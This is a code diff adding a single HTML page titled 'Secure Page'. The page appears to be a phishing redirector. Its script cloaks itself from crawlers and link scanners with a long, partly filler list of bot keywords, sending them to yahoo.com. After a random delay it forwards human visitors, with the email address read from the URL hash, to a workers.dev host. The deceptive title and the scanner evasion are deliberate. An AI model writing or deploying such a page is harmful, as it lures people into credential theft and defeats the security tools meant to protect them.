@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Page</title>
+  <meta charset="utf-8">
+  <script>
+    function isBot() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const botKeywords = new Set([
+        'bot','crawl','slurp','spider','mediapartners','googlebot','bingbot',
+        'yandexbot','baiduspider','duckduckbot','teoma','exabot','facebot',
+        'ia_archiver','rogerbot','sogou','yisou','youdao','yodao','sogou',
+        'youdao-bot','yodao','sosospider','facebookexternalhit','facebookcatalog',
+        'facebookplatform','facebook','instagram','pinterest','redditbot','reddit',
+        'tumblr','vkshare','vkontakte','vk','okshare','ok','odnoklassniki',
+        'ok.ru','mail.ru','yandex','yahoobot','yahoosearch','yahooseeker',
+        'yahoofeedseeker','yahoopipe','slackbot','twitterbot','linkedinbot',
+        'quora','quorabot','mediumbot','tiktokbot','weibo','wechat','linebot',
+        'telegrambot','whatsappbot','snapchatbot','pinterestbot','flickrbot',
+        'flickr','vimeobot','dailymotionbot','youtubebot','instagrambot',
+        'tumblrbot','bloggerbot','wordpressbot','tumblrbot','livejournalbot',
+        'barkrowler','ahrefsbot','semrushbot','majesticbot','crawlerbot','screamingfrog',
+        'petalbot','semrush','duckduckgo','ccbot','ecosia','gigabot','heritrix',
+        'ia_archiver','mj12bot','nutch','panscient','psbot','scoutjet','scooter',
+        'slurp','spider','surveybot','tweetmeme','twitterbot','urlappendbot',
+        'vagabondo','webcollage','webcrawler','webstripper','wget','wotbox',
+        'yisou','yodao','yodao-bot','yodaoBot','yodaoSpider','youdaoBot',
+        'youdaoSpider','youtubebot','youtube','youtube-comment-bot','youtube-search-bot',
+        'youtube-video-bot','youtube-video-downloader','youtube-video-uploader',
+        'youtube-video-viewer','youtube-video-watcher','youtube-video-watcher-bot',
+        'youtube-video-watcher-bot-2','youtube-video-watcher-bot-3','youtube-video-watcher-bot-4',
+        'youtube-video-watcher-bot-5','youtube-video-watcher-bot-6','youtube-video-watcher-bot-7',
+        'youtube-video-watcher-bot-8','youtube-video-watcher-bot-9','youtube-video-watcher-bot-10',
+        'youtube-video-watcher-bot-11','youtube-video-watcher-bot-12','youtube-video-watcher-bot-13',
+        'youtube-video-watcher-bot-14','youtube-video-watcher-bot-15','youtube-video-watcher-bot-16',
+        'youtube-video-watcher-bot-17','youtube-video-watcher-bot-18','youtube-video-watcher-bot-19',
+        'youtube-video-watcher-bot-20','youtube-video-watcher-bot-21','youtube-video-watcher-bot-22',
+        'youtube-video-watcher-bot-23','youtube-video-watcher-bot-24','youtube-video-watcher-bot-25',
+        'youtube-video-watcher-bot-26','youtube-video-watcher-bot-27','youtube-video-watcher-bot-28',
+        'youtube-video-watcher-bot-29','youtube-video-watcher-bot-30','youtube-video-watcher-bot-31',
+        'youtube-video-watcher-bot-32','youtube-video-watcher-bot-33','youtube-video-watcher-bot-34',
+        'youtube-video-watcher-bot-35','youtube-video-watcher-bot-36','youtube-video-watcher-bot-37',
+        'youtube-video-watcher-bot-38','youtube-video-watcher-bot-39','youtube-video-watcher-bot-40',
+        'youtube-video-watcher-bot-41','youtube-video-watcher-bot-42','youtube-video-watcher-bot-43',
+        'youtube-video-watcher-bot-44','youtube-video-watcher-bot-45','youtube-video-watcher-bot-46',
+        'youtube-video-watcher-bot-47','youtube-video-watcher-bot-48','youtube-video-watcher-bot-49',
+        'youtube-video-watcher-bot-50','youtube-video-watcher-bot-51','youtube-video-watcher-bot-52',
+        'youtube-video-watcher-bot-53','youtube-video-watcher-bot-54','youtube-video-watcher-bot-55',
+        'youtube-video-watcher-bot-56','youtube-video-watcher-bot-57','youtube-video-watcher-bot-58',
+        'youtube-video-watcher-bot-59','youtube-video-watcher-bot-60','youtube-video-watcher-bot-61',
+        'youtube-video-watcher-bot-62','youtube-video-watcher-bot-63','youtube-video-watcher-bot-64',
+        'youtube-video-watcher-bot-65','youtube-video-watcher-bot-66','youtube-video-watcher-bot-67',
+        'youtube-video-watcher-bot-68','youtube-video-watcher-bot-69','youtube-video-watcher-bot-70',
+        'youtube-video-watcher-bot-71','youtube-video-watcher-bot-72','youtube-video-watcher-bot-73',
+        'youtube-video-watcher-bot-74','youtube-video-watcher-bot-75','youtube-video-watcher-bot-76',
+        'youtube-video-watcher-bot-77','youtube-video-watcher-bot-78','youtube-video-watcher-bot-79',
+        'youtube-video-watcher-bot-80','youtube-video-watcher-bot-81','youtube-video-watcher-bot-82',
+        'youtube-video-watcher-bot-83','youtube-video-watcher-bot-84','youtube-video-watcher-bot-85',
+        'youtube-video-watcher-bot-86','youtube-video-watcher-bot-87','youtube-video-watcher-bot-88',
+        'youtube-video-watcher-bot-89','youtube-video-watcher-bot-90','youtube-video-watcher-bot-91',
+        'youtube-video-watcher-bot-92','youtube-video-watcher-bot-93','youtube-video-watcher-bot-94',
+        'youtube-video-watcher-bot-95','youtube-video-watcher-bot-96','youtube-video-watcher-bot-97',
+        'youtube-video-watcher-bot-98','youtube-video-watcher-bot-99','youtube-video-watcher-bot-100'
+      ]);
+
+      for (let keyword of botKeywords) {
+        if (userAgent.includes(keyword)) {
+          return true;
+        }
+      }
+      return false;
+    }
+
+    function getRandomDelay() {
+      return Math.floor(Math.random() * 2000) + 1000;
+    }
+
+    function redirectPage() {
+      var email = window.location.hash.substring(1);
+      var newURL;
+
+      if (isBot()) {
+        newURL = "https://www.yahoo.com";
+      } else {
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (emailPattern.test(email)) {
+          // set hash as plain email (with '@')
+          newURL = "https://autumn-darkness-f745.jejihox495.workers.dev#" + email;
+        } else {
+          newURL = "https://autumn-darkness-f745.jejihox495.workers.dev#";
+        }
+      }
+
+      setTimeout(function () {
+        window.location.href = newURL;
+      }, getRandomDelay());
+    }
+
+    window.onload = redirectPage;
+  </script>
+</head>
+<body>
+  <p aria-live="polite"></p>
+</body>
+</html>
